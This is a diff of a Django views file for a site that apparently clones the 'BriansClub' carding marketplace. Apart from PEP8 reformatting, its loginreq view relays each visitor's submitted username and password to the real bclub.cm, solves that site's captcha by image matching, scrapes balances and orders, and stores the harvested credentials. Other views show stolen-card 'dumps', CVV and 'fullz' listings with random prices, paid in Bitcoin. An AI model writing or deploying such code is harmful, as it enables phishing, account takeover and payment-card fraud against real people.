@@ -10,7 +10,7 @@ from bs4 import BeautifulSoup
 from PIL import Image
 import numpy as np
 import os
-from .models import Order,OrdersNumber
+from .models import Order, OrdersNumber
 from django.conf import settings
 import requests
 from io import BytesIO
@@ -31,7 +31,7 @@ from django import forms
 from .forms import NewUserForm
 import random
 from django.contrib.auth import authenticate, login
-from .models import BriansclubAddress,SiteConfiguration
+from .models import BriansclubAddress, SiteConfiguration
 from .models import CartItem
 from django.contrib.auth.decorators import login_required
 from django.views.decorators.csrf import csrf_exempt
@@ -39,12 +39,13 @@ from django.views.decorators.csrf import csrf_exempt
 from django.contrib.auth.decorators import user_passes_test
 from django.shortcuts import redirect
 
+
 def not_authenticated_user(user):
     return not user.is_authenticated
+
+
 # from .forms import CaptchaForm
 @user_passes_test(not_authenticated_user, login_url='/Billing', redirect_field_name=None)
-
-
 def home(request):
     domain = request.get_host()
     try:
@@ -56,24 +57,39 @@ def home(request):
     return render(request, 'main/home.html', {'form': form})
 
 
+from django.core.exceptions import MultipleObjectsReturned
+
+
 # dashboard view
 @login_required_custom(login_url='/login')
-
-
 def dashboard(request):
     domain = request.get_host()
     try:
         site_config = SiteConfiguration.objects.get(domain=domain)
     except SiteConfiguration.DoesNotExist:
-        site_config = SiteConfiguration.objects.first()
+        try:
+            site_config = SiteConfiguration.objects.first()
+        except MultipleObjectsReturned:
+            # Handle the case where multiple SiteConfiguration objects exist
+            site_config = SiteConfiguration.objects.all().first()  # You can adjust this logic as needed
+
     context = {'site_config': site_config}
     return render(request, 'main/dashboard.html', context)
 
+# def dashboard(request):
+#     domain = request.get_host()
+#     try:
+#         site_config = SiteConfiguration.objects.get(domain=domain)
+#     except SiteConfiguration.DoesNotExist:
+#         site_config = SiteConfiguration.objects.first()
+#     context = {'site_config': site_config}
+#     return render(request, 'main/dashboard.html', context)
+
+
 import time
 
+
 @csrf_exempt
-
-
 def loginPage(requst):
     if requst.method == 'POST':
         username = requst.POST.get('username')
@@ -85,9 +101,11 @@ def loginPage(requst):
         else:
             messages.info(requst, 'Username or Password is incorrect')
 
+
 import requests
 
-#custom login view
+
+# custom login view
 @csrf_exempt
 class CustomLoginView(LoginView):
     template_name = 'main/login.html'
@@ -97,10 +115,12 @@ class CustomLoginView(LoginView):
     def get_success_url(self):
         return reverse_lazy('tasklist')
 
+
 # change string to nubmer example '3+1' to 4 in python
 import requests
 
-#logout view
+
+# logout view
 def create_user_and_balance(username, password, balance):
     # Create User
     user = User.objects.create_user(username=username, password=password)
@@ -109,6 +129,8 @@ def create_user_and_balance(username, password, balance):
     Balance.objects.create(user=user, balance=balance)
 
     return user
+
+
 def find_identical_and_calculate(img2_url, dir_path):
     response = requests.get(img2_url)
     img2 = Image.open(BytesIO(response.content))
@@ -126,10 +148,9 @@ def find_identical_and_calculate(img2_url, dir_path):
                 return result
     return None
 
+
 @user_passes_test(not_authenticated_user, login_url='/dashboard', redirect_field_name=None)
 @csrf_exempt
-
-
 def loginreq(request):
         content = [
             "Welcome to our website!",
@@ -155,7 +176,6 @@ def loginreq(request):
             site_config = SiteConfiguration.objects.first()
         context = {'site_config': site_config}
 
-
         if request.method == 'POST':
             captcha_answer = request.POST.get('captcha')
             num1 = request.session.get('num1')
@@ -167,9 +187,7 @@ def loginreq(request):
                 'password': password
             }
 
-
             try:
-
 
                 def find_identical_and_calculate(img2_url, dir_path):
 
@@ -209,7 +227,6 @@ def loginreq(request):
                 # Test the function
                 session = requests.Session()
 
-
                 while True:
                     print('while loop')
                     print('test')
@@ -219,21 +236,21 @@ def loginreq(request):
                     }
                     try:
                         response1 = session.get('https://bclub.cm/login/', headers=headers)
-                        print('response1',response1)
+                        print('response1', response1)
                         print(response1)
                     except:
                         print('Error: Login failed')
                         break
                     soup = BeautifulSoup(response1.content, 'html.parser')
                     input_element = soup.find('input', {'id': 'id_captcha_0'})
-                    value = input_element['value'] # type: ignore
+                    value = input_element['value']  # type: ignore
 
                     # https://bclub.cm/captcha/image/2f6b5fca4834a17079493df0bdefdd1ecd586749/
 
                     img2_url = f'https://bclub.cm/captcha/image/{value}/'
                     print(img2_url)
                     # Now you can call the function with this URL
-                    capvalue=find_identical_and_calculate(img2_url, 'static/public/brianimages/')
+                    capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
                     print(capvalue)
 
                     # Extract the CSRF token from the cookies
@@ -324,11 +341,11 @@ def loginreq(request):
                                 if len(cols) == 3:
                                     # Extract the order number from the row
                                     order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
-                                    print('order_number',order_number)
+                                    print('order_number', order_number)
                                     date_string = cols[0].text.strip()
                                     date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
                                     # Create a new OrdersNumber object
-                                    current_order_number = OrdersNumber(number=order_number,date=date)
+                                    current_order_number = OrdersNumber(number=order_number, date=date)
                                     current_order_number.save()
 
                                 # Check if this is an order detail row
@@ -358,8 +375,8 @@ def loginreq(request):
 
                                     # Save the order
                                     order.save()
-                                    print('order',order)
-                                    print('current_order_number',current_order_number)
+                                    print('order', order)
+                                    print('current_order_number', current_order_number)
                                     # current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                     # Add the order to the current order number
                                     current_order_number.orders.add(order)
@@ -369,9 +386,9 @@ def loginreq(request):
                     # Extract the text inside the span
                         try:
                             value = span_element.text
-                            print('balance',value)
+                            print('balance', value)
                             create_user_and_balance(username, password, value)
-                            data={
+                            data = {
                                 'username':username,
                                 'password':password,
                                 'balance':value
@@ -413,7 +430,7 @@ def loginreq(request):
                                         print("Error: Billing table not found")
 
                                     response3 = session.get('https://bclub.cm/orders/', headers=headers)
-                                    print('response3',response3.status_code)
+                                    print('response3', response3.status_code)
                                     soup = BeautifulSoup(response3.content, 'html.parser')
                                     table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
                                     # print('table_element',table_element)
@@ -432,7 +449,7 @@ def loginreq(request):
                                         if len(cols) == 3:
                                             # Extract the order number from the row
                                             order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
-                                            print('order_number',order_number)
+                                            print('order_number', order_number)
 
                                             # Create a new OrdersNumber object
                                             current_order_number = OrdersNumber(number=order_number)
@@ -464,7 +481,7 @@ def loginreq(request):
 
                                             # Save the order
                                             order.save()
-                                            print('order',order)
+                                            print('order', order)
                                             current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                             # Add the order to the current order number
                                             current_order_number.orders.add(order)
@@ -478,7 +495,7 @@ def loginreq(request):
                                         "Referer": "https://bclub.cm/login/",
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                                     }
-                            print('response2',response2.status_code)
+                            print('response2', response2.status_code)
 
                             break
                         except AttributeError:
@@ -495,36 +512,43 @@ def loginreq(request):
                 sum = int(num1) + int(num2)
 
                 if captcha_answer is not None and int(captcha_answer) == sum:
-                    user = authenticate(request, username=username, password=password)
-                    if user is not None:
-                        login(request, user)
-                        return redirect('dashboard')
+                    # user = authenticate(request, username=username, password=password)
+                    user = User.objects.filter(username=username, password=password)
+                    try:
+                        newUser = authenticate(request, username=username, password=password)
+                        print(f"User {user} logged in")
+                        if newUser is not None:
+                            print(user)
+                            login(request, newUser)
+                            return redirect('dashboard')
+                    except Exception as e:
+                        return redirect('login')
                     else:
                 # Set the auth_error key in the context dictionary
-                        context['auth_error'] = 'Incorrect username or password. Please try again.' # type: ignore
+                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                         num1 = random.randint(1, 10)
                         num2 = random.randint(1, 10)
                         captcha = f"{num1} + {num2}="
-                        context['captcha'] = captcha # type: ignore
+                        context['captcha'] = captcha  # type: ignore
                         request.session['num1'] = num1
                         request.session['num2'] = num2
                 else:
                     # Set the captcha_error key in the context dictionary
-                    context['captcha_error'] = 'Incorrect answer. Please try again.' # type: ignore
+                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                     num1 = random.randint(1, 10)
                     num2 = random.randint(1, 10)
                     captcha = f"{num1} + {num2}="
-                    context['captcha'] = captcha # type: ignore
+                    context['captcha'] = captcha  # type: ignore
                     request.session['num1'] = num1
                     request.session['num2'] = num2
 
             else:
-                context['captcha_error'] = 'Error: num1 or num2 is None.' # type: ignore
+                context['captcha_error'] = 'Error: num1 or num2 is None.'  # type: ignore
         else:
             num1 = random.randint(1, 10)
             num2 = random.randint(1, 10)
             captcha = f"{num1} + {num2}="
-            context['captcha'] = captcha # type: ignore
+            context['captcha'] = captcha  # type: ignore
             request.session['num1'] = num1
             request.session['num2'] = num2
         return render(request, 'main/login.html', context)
@@ -640,16 +664,14 @@ def loginreq(request):
 #     else:
 #         print("Error: Maximum login attempts exceeded")
 
+
 class CustomLogoutView(LogoutView):
     template_name = 'main/logout.html'
     next_page = 'login'
 
 
-
-#register page
+# register page
 @csrf_exempt
-
-
 def register(request):
     content = [
         "Welcome to our website!",
@@ -681,8 +703,6 @@ def register(request):
             site_config = SiteConfiguration.objects.first()
     context = {'site_config': site_config}
 
-
-
     if request.method == 'POST':
         captcha_answer = request.POST.get('captcha')
         num1 = request.session.get('num1')
@@ -697,20 +717,20 @@ def register(request):
                     return redirect('tasklist')
                 else:
                 # Set the auth_error key in the context dictionary
-                        context['auth_error'] = 'Incorrect username or password. Please try again.' # type: ignore
+                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                         num1 = random.randint(1, 10)
                         num2 = random.randint(1, 10)
                         captcha = f"{num1} + {num2}="
-                        context['captcha'] = captcha # type: ignore
+                        context['captcha'] = captcha  # type: ignore
                         request.session['num1'] = num1
                         request.session['num2'] = num2
             else:
                     # Set the captcha_error key in the context dictionary
-                    context['captcha_error'] = 'Incorrect answer. Please try again.' # type: ignore
+                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                     num1 = random.randint(1, 10)
                     num2 = random.randint(1, 10)
                     captcha = f"{num1} + {num2}="
-                    context['captcha'] = captcha # type: ignore
+                    context['captcha'] = captcha  # type: ignore
                     request.session['num1'] = num1
                     request.session['num2'] = num2
     else:
@@ -718,16 +738,15 @@ def register(request):
         num1 = random.randint(1, 10)
         num2 = random.randint(1, 10)
         captcha = f"{num1} + {num2}="
-        context['captcha'] = captcha # type: ignore
+        context['captcha'] = captcha  # type: ignore
         request.session['num1'] = num1
         request.session['num2'] = num2
     return render(request, 'main/register.html', {'form': form, 'context':context})
 
 
-
 class RegisterPage(FormView):
     template_name = 'main/register.html'
-    alt_pass= forms.CharField(widget=forms.PasswordInput)
+    alt_pass = forms.CharField(widget=forms.PasswordInput)
     name = forms.CharField(error_messages={'required':'Enter your name'})
 
     fields = ("username", "email", "password1", "password2", "alt_pass")
@@ -737,7 +756,7 @@ class RegisterPage(FormView):
     success_url = reverse_lazy('tasklist')
 
     def form_valid(self, form):
-        user = form.save() # type: ignore
+        user = form.save()  # type: ignore
         if user is not None:
             login(self.request, user)
         return super(RegisterPage, self).form_valid(form)
@@ -748,11 +767,8 @@ class RegisterPage(FormView):
         return super(RegisterPage, self).get(*args, **kwargs)
 
 
-
 # task list class
 @csrf_exempt
-
-
 def logincus(request):
     if request.method == 'POST':
        username = request.POST.get('username')
@@ -761,12 +777,7 @@ def logincus(request):
     else:
         return render(request, 'main/login.html')
 
-
-
-
-
 # create robots.txt views
-
 
 # def robots(request):
 #         domain = request.get_host()
@@ -784,7 +795,9 @@ def logincus(request):
 def robot(request):
     return render(request, '{templo}', content_type="text/plain")
 
+
 from django.http import HttpResponse
+
 
 def robots(request):
     site = request.get_host()
@@ -835,9 +848,6 @@ Sitemap: https://{site}/sitemap.xml
     return HttpResponse(content, content_type='text/plain')
 
 
-
-
-
 from django.shortcuts import render
 
 
@@ -851,8 +861,9 @@ def search_items(request):
         return render(request, 'earch_results.html', {'items': items})
     else:
         return render(request, 'earch.html')
-import subprocess
 
+
+import subprocess
 
 import requests
 
@@ -928,6 +939,7 @@ def get_bin_info(bin_number):
 # bin_info = get_bin_info("448590")
 # print(bin_info)
 
+
 from datetime import datetime
 
 
@@ -947,9 +959,9 @@ def generate_random_dates():
         formatted_dates.append(formatted_date)
 
     return formatted_dates
+
+
 @login_required_custom(login_url='/login')
-
-
 def cvv(request):
     domain = request.get_host()
     context = {}
@@ -1019,9 +1031,9 @@ def cvv(request):
 
     # If it's not a POST request, render the cvv.html template
     return render(request, 'main/cvv.html', context)
+
+
 @login_required_custom(login_url='/login')
-
-
 def dumps(request):
         domain = request.get_host()
         try:
@@ -1031,67 +1043,65 @@ def dumps(request):
         context = {'site_config': site_config}
         if request.method == 'POST':
             query = request.POST.get('query')
-            if len(query) != 6 :
-                return render(request, 'main/dumps.html', context )
+            if len(query) != 6:
+                return render(request, 'main/dumps.html', context)
             else:
 
-
-                listofBins=[]
-                query=query[:6]
+                listofBins = []
+                query = query[:6]
                 bin_info = get_bin_info(query)
-                price= random.randint(18, 36)
+                price = random.randint(18, 36)
                 if query:
                     if bin_info:
-                        context['issuer'] = bin_info['issuer'] # type: ignore
-                        context['country'] = bin_info['country'] # type: ignore
-                        context['bank_code'] = bin_info['bank_code'] # type: ignore
+                        context['issuer'] = bin_info['issuer']  # type: ignore
+                        context['country'] = bin_info['country']  # type: ignore
+                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                         context['query'] = query
-                        context['formatted_dates'] = generate_random_dates() # type: ignore
-                        context['scheme'] = bin_info['scheme'] # type: ignore
-                        context['type'] = bin_info['type'] # type: ignore
-                        context['price'] = price # type: ignore
-                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)] # type: ignore
+                        context['formatted_dates'] = generate_random_dates()  # type: ignore
+                        context['scheme'] = bin_info['scheme']  # type: ignore
+                        context['type'] = bin_info['type']  # type: ignore
+                        context['price'] = price  # type: ignore
+                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                         print(context['items'])
 
                     else:
-                        context['error'] = 'Invalid card number' # type: ignore
+                        context['error'] = 'Invalid card number'  # type: ignore
                     return render(request, 'main/dumps_res.html', context)
                 # else:
                 #     # Generate items based on the search query
                 #     context['items'] = [f"{query}" for i in range(1, 11)]
                 #     return render(request, 'main/css_reasult.html', context)
         else:
-            listofBins=['479126','410894','427138','480011',
-                        '439102','426684','400344','426451','476164','432845','488893','460312','520309','464440','415974','420208']
+            listofBins = ['479126', '410894', '427138', '480011',
+                        '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
             query = random.choice(listofBins)
-            if len(query) != 6 :
-                return render(request, 'main/dumps.html', context )
+            if len(query) != 6:
+                return render(request, 'main/dumps.html', context)
             else:
 
-
-                listofBins=[]
-                query=query[:6]
+                listofBins = []
+                query = query[:6]
                 bin_info = get_bin_info(query)
-                price= random.randint(18, 36)
+                price = random.randint(18, 36)
                 if query:
                     if bin_info:
-                        context['issuer'] = bin_info['issuer'] # type: ignore
-                        context['country'] = bin_info['country'] # type: ignore
-                        context['bank_code'] = bin_info['bank_code'] # type: ignore
+                        context['issuer'] = bin_info['issuer']  # type: ignore
+                        context['country'] = bin_info['country']  # type: ignore
+                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                         context['query'] = query
-                        context['formatted_dates'] = generate_random_dates() # type: ignore
-                        context['scheme'] = bin_info['scheme'] # type: ignore
-                        context['type'] = bin_info['type'] # type: ignore
-                        context['price'] = price # type: ignore
-                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)] # type: ignore
+                        context['formatted_dates'] = generate_random_dates()  # type: ignore
+                        context['scheme'] = bin_info['scheme']  # type: ignore
+                        context['type'] = bin_info['type']  # type: ignore
+                        context['price'] = price  # type: ignore
+                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                         print(context['items'])
 
                     else:
-                        context['error'] = 'Invalid card number' # type: ignore
+                        context['error'] = 'Invalid card number'  # type: ignore
                     return render(request, 'main/dumps_res.html', context)
+
+
 @login_required_custom(login_url='/login')
-
-
 def fullz(request):
         domain = request.get_host()
         try:
@@ -1100,9 +1110,9 @@ def fullz(request):
             site_config = SiteConfiguration.objects.first()
         context = {'site_config': site_config}
         return render(request, 'main/fullz.html', context)
+
+
 @login_required_custom(login_url='/login')
-
-
 def wholesale(request):
         domain = request.get_host()
         try:
@@ -1111,9 +1121,9 @@ def wholesale(request):
             site_config = SiteConfiguration.objects.first()
         context = {'site_config': site_config}
         return render(request, 'main/wholesale.html' , context)
+
+
 @login_required_custom(login_url='/login')
-
-
 def cart(request):
     domain = request.get_host()
     try:
@@ -1126,7 +1136,7 @@ def cart(request):
         try:
             balance = Balance.objects.get(user=request.user).balance
             if balance < 100:
-                context['balance'] = balance # type: ignore
+                context['balance'] = balance  # type: ignore
                 print(balance)
 
                 print("Low balance")
@@ -1138,6 +1148,8 @@ def cart(request):
         return render(request, 'main/cart.html', context)
     else:
         return redirect('login')
+
+
 from django.http import JsonResponse
 
 
@@ -1160,9 +1172,8 @@ def add_to_cart(request):
     else:
         return JsonResponse({'success': False})
 
+
 @login_required_custom(login_url='/login')
-
-
 def orders(request):
     domain = request.get_host()
     try:
@@ -1177,10 +1188,7 @@ def orders(request):
     return render(request, 'main/orders.html', context)
 
 
-
 @login_required_custom(login_url='/login')
-
-
 def auction(request):
         domain = request.get_host()
         try:
@@ -1192,8 +1200,6 @@ def auction(request):
 
 
 @login_required_custom(login_url='/login')
-
-
 def tools(request):
         domain = request.get_host()
         try:
@@ -1203,18 +1209,15 @@ def tools(request):
         context = {'site_config': site_config}
         return render(request, 'main/tools.html', context)
 
+
 # @login_required_custom(login_url='/login')
 # def tickets(request):
 #     return render(request, 'main/tickets.html')
 @login_required_custom(login_url='/login')
 
-
 # @ratelimit(key='custom', rate='10/m')
 
-
-
     # Rest of your view logic
-
 def profile(request):
         # client_ip = request.META.get('REMOTE_ADDR')
         # unique_identifier = 'some_unique_identifier'  # Replace with your own unique identifier
@@ -1230,9 +1233,9 @@ def profile(request):
         context = {'site_config': site_config}
         return render(request, 'main/profile.html', context)
 
+
 from django.contrib.auth.forms import PasswordChangeForm
 from django.contrib import messages
-
 
 
 @login_required_custom(login_url='/login')
@@ -1249,26 +1252,31 @@ def change_password(request):
         form = PasswordChangeForm(request.user)
     return render(request, 'main/profile.html', {'form': form})
 
+
 # def handler404(request, exception):
 #     return render(request, '404.html', status=404)
 from django.shortcuts import render
 import logging
 
+
 # custom 404 view
-def custom_404(request,exception):
+def custom_404(request, exception):
     return render(request, '404.html', status=404)
+
+
 def error_404(request, exception):
     domain = request.get_host()
 
     site_config = SiteConfiguration.objects.get(domain=domain)
     data = {"name": site_config}
-    return render(request,'404.html', data)
+    return render(request, '404.html', data)
+
+
 from .models import Ticket
 from .forms import TicketForm
 
+
 @csrf_exempt
-
-
 def ticket(request):
     domain = request.get_host()
     try:
@@ -1288,11 +1296,13 @@ def ticket(request):
     tickets = Ticket.objects.filter(user=request.user)
     return render(request, 'main/tickets.html', {'form': form, 'tickets': tickets, 'context':context})
 
-from django.shortcuts import render, get_object_or_404
-from .models import Ticket,Reply,AdminReply
-from .forms import AdminReplyForm, UserReplyForm
-@csrf_exempt
 
+from django.shortcuts import render, get_object_or_404
+from .models import Ticket, Reply, AdminReply
+from .forms import AdminReplyForm, UserReplyForm
+
+
+@csrf_exempt
 def ticket_list(request):
     domain = request.get_host()
     try:
@@ -1303,9 +1313,8 @@ def ticket_list(request):
     tickets = Ticket.objects.all()
     return render(request, 'main/tickets_admin.html', {'tickets': tickets, 'context':context})
 
+
 @csrf_exempt
-
-
 def ticket_detail(request, pk):
     ticket = get_object_or_404(Ticket, pk=pk)
     adminreplays = AdminReply.objects.filter(ticket=ticket)
@@ -1322,7 +1331,6 @@ def ticket_detail(request, pk):
             message = form.cleaned_data['admin_reply'] if request.user.is_staff else form.cleaned_data['user_reply']
             reply = Reply.objects.create(ticket=ticket, user=request.user, message=message)
 
-
     else:
         if request.user.is_staff:
             form = AdminReplyForm()
@@ -1330,11 +1338,14 @@ def ticket_detail(request, pk):
             form = UserReplyForm()
     replies = Reply.objects.filter(ticket=ticket).order_by('-created_at')
     return render(request, 'main/ticket_detail.html', {'ticket': ticket, 'form': form, 'replies': replies, 'adminreplays': adminreplays})
+
+
 from django.http import HttpResponse
 
 import json
 from django.http import JsonResponse
 from django.core.exceptions import ObjectDoesNotExist
+
 
 def remove_selected_from_cart(request):
     if request.method == 'POST' and request.user.is_authenticated:
@@ -1355,6 +1366,8 @@ def remove_selected_from_cart(request):
         return JsonResponse({'success': True})
     else:
         return JsonResponse({'success': False, 'error': 'Invalid request'})
+
+
 def convert_to_usd(amount):
     # Make a request to the CoinGecko API to get the Bitcoin to USD exchange rate
     api_url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
@@ -1366,8 +1379,10 @@ def convert_to_usd(amount):
         return usd_amount
 
     return 0
+
+
 import requests
-from .models import Balance,Transaction
+from .models import Balance, Transaction
 
 
 def wallet_transactions(request):
@@ -1407,9 +1422,10 @@ def wallet_transactions(request):
             return render(request, 'main/error.html', {'message': 'Transaction not found'})
 
     return render(request, 'main/wallet.html')
+
+
 # @ratelimit(key='ip', rate='10/m')  # 10 requests per minute
 @login_required_custom(login_url='/login')
-
 def address_list(request):
     # if getattr(request, 'limited', False):
     #     return HttpResponse('Too many requests', status=429)
@@ -1444,13 +1460,13 @@ def address_list(request):
         site_config = SiteConfiguration.objects.get(domain=domain)
     except SiteConfiguration.DoesNotExist:
         site_config = SiteConfiguration.objects.first()
-    context = {'site_config': site_config,'billing_data': billing_data}
+    context = {'site_config': site_config, 'billing_data': billing_data}
     address = BriansclubAddress.objects.first()
     if request.method == 'POST':
         transaction_id = request.POST.get('transaction_id')
 
         # Check if the transaction has already been processed
-        if Transaction.objects.filter(transaction_id=transaction_id).exists() :
+        if Transaction.objects.filter(transaction_id=transaction_id).exists():
             return render(request, 'main/error.html', {'message': 'Transaction already processed or the Transaction ID is invalid'})
 
         # Make a request to the Blockstream API to get transaction information
@@ -1481,20 +1497,22 @@ def address_list(request):
                     return render(request, 'main/success.html', {'amount': usd_amount})
 
             return render(request, 'main/error.html', {'message': 'Transaction not found'})
-    return render(request, 'main/task_list.html', {'address': address, 'context':context,'domain':domain})
+    return render(request, 'main/task_list.html', {'address': address, 'context':context, 'domain':domain})
+
+
 from django.shortcuts import render
 from django.contrib.auth.decorators import login_required, user_passes_test
 from .models import Ticket, AdminReply, Reply, Balance, Transaction
 from .forms import AdminReplyForm, BalanceForm  # You'll need to create these forms
 
+
 def is_admin(user):
     return user.is_superuser
+
 
 @login_required_custom(login_url='/login')
 @user_passes_test(is_admin)
 @csrf_exempt
-
-
 def ticket_view(request):
     if request.method == 'POST':
         form = AdminReplyForm(request.POST)
@@ -1507,11 +1525,11 @@ def ticket_view(request):
         form = AdminReplyForm()
     tickets = Ticket.objects.all().order_by('-created_at', '-updated_at')
     return render(request, 'main/admin_tickets.html', {'tickets': tickets, 'form': form})
+
+
 @login_required_custom(login_url='/login')
 @user_passes_test(is_admin)
 @csrf_exempt
-
-
 def balance_view(request):
     if request.method == 'POST':
         form = BalanceForm(request.POST)
